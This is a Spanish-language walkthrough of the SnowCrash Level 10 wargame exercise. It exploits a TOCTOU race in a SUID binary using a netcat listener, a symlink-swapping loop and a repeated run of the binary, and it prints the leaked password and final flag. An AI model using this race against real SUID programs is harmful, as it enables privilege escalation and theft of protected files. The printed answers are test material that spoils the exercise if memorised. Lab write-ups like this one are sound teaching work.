# SnowCrash - Level 10: Explotación de TOCTOU (Race Condition)

Este repositorio documenta la resolución del **Nivel 10**. El reto consiste en explotar una vulnerabilidad de tipo **TOCTOU** (*Time-of-Check to Time-of-Use*) en un binario SUID que realiza validaciones de acceso insuficientes.

## 1. Análisis Inicial

Encontramos un binario SUID y un archivo `token` que no podemos leer:

```bash
ls -la
# -rwsr-sr-x+ 1 flag10  level10 10817 Mar  5  2016 level10
# -rw-------  1 flag10  flag10     26 Mar  5  2016 token

```

### Comportamiento del programa

Al ejecutar `./level10`, el programa nos indica su uso:
`./level10 file host` -> *"Envia el archivo al host si tienes acceso a él"*.

---

## 2. Ingeniería Inversa y Deducción

Para entender cómo funciona el binario y por qué es vulnerable, realizamos un análisis profundo:

### A. Identificación del Puerto y Protocolo

Usando `strings level10`, descubrimos información crítica que el programa no muestra en su ayuda:

* **Puerto:** `Connecting to %s:6969 ..` -> El programa usa el puerto **6969**.
* **Banner:** `.*( )*.` -> Antes de enviar el archivo, envía esta cadena como cabecera.

### B. Análisis de Funciones (Vulnerabilidad TOCTOU)

Usando `nm level10` (o analizando el flujo), vemos que el programa usa dos funciones de sistema clave en este orden:

1. **`access()`**: Comprueba si el **usuario real** (level10) tiene permiso para leer el archivo.
2. **`open()`**: Abre el archivo para enviarlo. Al ser un binario SUID, esta apertura se hace con los privilegios del **usuario efectivo** (flag10).

**El Fallo:** Existe un intervalo de tiempo infinitesimal entre la comprobación (`access`) y el uso (`open`). Si el archivo cambia en ese intervalo, el programa usará un archivo distinto al que validó.

---

## 3. Estrategia de Explotación

Para ganar la "carrera", debemos automatizar tres procesos simultáneos dentro de la VM:

### Paso 1: El Receptor (Netcat)

Escuchamos en el puerto identificado (6969) para capturar la salida del binario. Usamos un bucle para mantener la escucha activa:

```bash
while true; do nc -lk 6969; done

```

### Paso 2: El Intercambiador de Enlaces (The Racer)

Creamos un archivo que sí podemos leer (`/tmp/fake`) y usamos un bucle para que el enlace simbólico `/tmp/exploit` alterne frenéticamente entre el archivo falso y el `token` real:

```bash
touch /tmp/fake
while true; do
    ln -sf /tmp/fake /tmp/exploit
    ln -sf /home/user/level10/token /tmp/exploit;
done

```

### Paso 3: El Atacante

Ejecutamos el binario repetidamente apuntando a nuestro enlace simbólico:

```bash
while true; do ./level10 /tmp/exploit 127.0.0.1; done

```

---

## 4. Resultado y Resolución

Tras unos segundos de ejecución, en la terminal del receptor (Netcat) empezaron a llegar los banners, y eventualmente, la contraseña filtrada:

```text
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.

```

* **Contraseña de flag10:** `woupa2yuojeeaaed06riuj63c`

### Escalada de Privilegios:

1. **Acceso:** `su flag10` (introduciendo la contraseña obtenida).
2. **Validación:** `getflag`

* **Token Final:** `feulo4b72j7edeahuete3no7c`

**Level 10 passed!**

---

## 5. Conclusiones Técnicas

* **TOCTOU:** Esta vulnerabilidad enseña que el estado de un sistema (permisos de un archivo) puede cambiar entre la verificación y la acción.
* **Uso de `access()`:** En binarios SUID, usar `access()` para validar permisos es una práctica de riesgo. Es preferible intentar abrir el archivo directamente con `open()` y manejar el error, o usar `fstat()` para verificar el i-nodo.
* **Race Conditions:** La automatización mediante bucles en la shell es una técnica eficaz para explotar ventanas de tiempo extremadamente cortas.

---
